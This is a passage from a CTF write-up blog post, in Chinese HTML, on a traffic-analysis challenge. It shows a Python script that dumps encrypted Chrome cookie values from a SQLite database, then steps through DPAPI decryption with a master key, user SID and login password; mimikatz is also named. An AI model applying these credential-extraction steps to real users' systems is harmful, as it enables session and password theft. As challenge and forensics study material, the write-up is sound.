+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> getenv</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">conn = sqlite3.connect(<span class="string">"Cookies"</span>)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line">cursor.execute(<span class="string">'SELECT encrypted_value FROM cookies'</span>)</span><br><span class="line"><span class="keyword">for</span> result <span class="keyword">in</span> cursor.fetchall():</span><br><span class="line">    <span class="keyword">print</span> (binascii.b2a_hex(result[<span class="number">0</span>]))</span><br><span class="line">    f = open(<span class="string">'blob.txt'</span>, <span class="string">'wb'</span>)</span><br><span class="line">    f.write(result[<span class="number">0</span>])</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>
+
+<p>然后，使用Windows Password Recovery这个软件进行解密。选择<code>Utils-&gt;DPAPI Decoder and Analyser-&gt;Decrypt DPAPI data blob</code></p>
+<p><code>blob file</code>选择刚才导出的<code>blob.txt</code> - -</p>
+<p><img src="/2019/11/06/Two-flow-analysis-problems-of-3CTF/1573008227100.png" alt="1573008227100"></p>
+<p>然后选择好<code>Master Key file</code> - -</p>
+<p><img src="/2019/11/06/Two-flow-analysis-problems-of-3CTF/1573008288010.png" alt="1573008288010"></p>
+<p>填好<code>User SID</code>和用户登录密码 - -</p>
+<p><img src="/2019/11/06/Two-flow-analysis-problems-of-3CTF/1573008346907.png" alt="1573008346907"></p>
+<p>然后恢复出密码 - -</p>
+<p><img src="/2019/11/06/Two-flow-analysis-problems-of-3CTF/1573007608950.png" alt="1573007608950"></p>
+<p>注意：使用Windows Password Recovery解密Master Key File的时候，如果出现打不开这种情况 - -</p>
+<p><img src="/2019/11/06/Two-flow-analysis-problems-of-3CTF/1573008535066.png" alt="1573008535066"></p>
+<p>那一定是从Wireshark导出的时候，删除前面数据的时候删多了，比如像这样 - -</p>
+<p><img src="/2019/11/06/Two-flow-analysis-problems-of-3CTF/1573008605138.png" alt="1573008605138"></p>
+<p>这当然打不开，开头必须是<code>02 00</code> （因为我一开始也删多了然后拿它和本机系统的文件比对了一下- -</p>
+<p><img src="/2019/11/06/Two-flow-analysis-problems-of-3CTF/1573008664282.png" alt="1573008664282"></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="http://laure1.github.io">Laurel</a>
+            <p>原文链接：<a href="https://laure1.github.io/2019/11/06/Two-flow-analysis-problems-of-3CTF/">https://laure1.github.io/2019/11/06/Two-flow-analysis-problems-of-3CTF/</a>
+            <p>发表日期：<a href="https://laure1.github.io/2019/11/06/Two-flow-analysis-problems-of-3CTF/">November 6th 2019, 8:20:21 pm</a>
+            <p>更新日期：<a href="https://laure1.github.io/2019/11/06/Two-flow-analysis-problems-of-3CTF/">November 6th 2019, 7:48:16 am</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/10/20/BUUCTF-WEB/" title= "BUUCTF-WEB">
+                    <div class="prevTitle">BUUCTF-WEB</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:laure1@yeah.net" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+    
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title=qq>
+                  
+                  <img class="profile-qr" src="/assets/qq.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/1aur2l" class="iconfont-archer instagram" target="_blank" title=instagram></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+    
+    <script src="https://eqcn.ajz.miesnfu.com/wp-content/plugins/wp-3d-pony/live2dw/lib/L2Dwidget.min.js"></script>
+    <script>
+    L2Dwidget.init({
+        "model": {
+            jsonPath: "https://unpkg.com/live2d-widget-model-tororo@1.0.5/assets/tororo.model.json",
+            "scale": 1
+        },
+        "display": {
+            "position": "left", 
+            "width": 150,  
+            "height": 300, 
+            "hOffset": 102,
+            "vOffset": -150
+        },
+        "mobile": {
+            "show": true,
+            "scale": 0.2
+        },
+        "react": {
+            "opacityDefault": 1,
+            "opacityOnHover": 1
+        },
+
+    });
+    </script>
+
+</footer>
+
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#第一道忘了叫啥了"><span class="toc-number">1.</span> <span class="toc-text">第一道忘了叫啥了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第二道好像是叫黑客攻击啥的"><span class="toc-number">2.</span> <span class="toc-text">第二道好像是叫黑客攻击啥的</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#方法一：使用mimikatz"><span class="toc-number">2.1.</span> <span class="toc-text">方法一：使用mimikatz</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#方法二：利用Windows-Password-Recovery软件"><span class="toc-number">2.2.</span> <span class="toc-text">方法二：利用Windows Password Recovery软件</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 11
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/2019/11/06/Two-flow-analysis-problems-of-3CTF/" >Two flow analysis problems of 3CTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/20</span><a class="archive-post-title" href= "/2019/10/20/BUUCTF-WEB/" >BUUCTF-WEB</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/14</span><a class="archive-post-title" href= "/2019/10/14/php-ini-setting-phar-readonly/" >php.ini_setting_phar.readonly</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/04</span><a class="archive-post-title" href= "/2019/10/04/C-Basic-Learning/" >C++ Basic Learning №.1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/01</span><a class="archive-post-title" href= "/2019/10/01/National-Day/" >National Day </a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/25</span><a class="archive-post-title" href= "/2019/09/25/zjctf2019/" >ZJCTF2019</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/09</span><a class="archive-post-title" href= "/2019/09/09/Base64-Encode-and-Decode/" >Base64 Encode and Decode</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/06</span><a class="archive-post-title" href= "/2019/09/06/Java-遥控风扇/" >Java Remote Control Fan</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/31</span><a class="archive-post-title" href= "/2019/08/31/SQL-injection-with-raw-MD5-hashes/" >SQL injection with raw MD5 hashes</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/11</span><a class="archive-post-title" href= "/2019/08/11/Summary-of-Web/" >Summary of Web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/09</span><a class="archive-post-title" href= "/2019/08/09/Summary-of-Misc/" >Summary of Misc</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="Web"><span class="iconfont-archer">&#xe606;</span>Web</span>
+    
+        <span class="sidebar-tag-name" data-tags="Brush"><span class="iconfont-archer">&#xe606;</span>Brush</span>
+    
+        <span class="sidebar-tag-name" data-tags="Java"><span class="iconfont-archer">&#xe606;</span>Java</span>
+    
+        <span class="sidebar-tag-name" data-tags="Misc"><span class="iconfont-archer">&#xe606;</span>Misc</span>
+    
+        <span class="sidebar-tag-name" data-tags="C++"><span class="iconfont-archer">&#xe606;</span>C++</span>
+    
+        <span class="sidebar-tag-name" data-tags="Emotions"><span class="iconfont-archer">&#xe606;</span>Emotions</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQL"><span class="iconfont-archer">&#xe606;</span>SQL</span>
+    
+        <span class="sidebar-tag-name" data-tags="Competition"><span class="iconfont-archer">&#xe606;</span>Competition</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="CTF"><span class="iconfont-archer">&#xe60a;</span>CTF</span>
+    
+        <span class="sidebar-category-name" data-categories="JAVA"><span class="iconfont-archer">&#xe60a;</span>JAVA</span>
+    
+        <span class="sidebar-category-name" data-categories="POSTGRADUATE"><span class="iconfont-archer">&#xe60a;</span>POSTGRADUATE</span>
+    
+        <span class="sidebar-category-name" data-categories="SQL"><span class="iconfont-archer">&#xe60a;</span>SQL</span>
+    
+        <span class="sidebar-category-name" data-categories="PHP"><span class="iconfont-archer">&#xe60a;</span>PHP</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Laurel"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
